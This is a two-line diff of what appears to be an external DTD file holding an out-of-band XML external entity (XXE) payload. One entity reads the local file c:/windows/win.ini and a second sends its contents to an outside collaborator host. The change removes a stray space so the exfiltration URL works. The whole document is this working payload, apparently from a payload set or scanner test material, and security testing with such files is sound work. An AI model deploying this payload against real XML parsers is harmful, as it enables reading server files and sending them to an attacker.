@@ -1,2 +1,2 @@
 <!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM ' http://n4sf8e1kmq7h1rdyxlb9r32fm6sygn.collab.lsg.dev/%data;'>">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://n4sf8e1kmq7h1rdyxlb9r32fm6sygn.collab.lsg.dev/%data;'>">
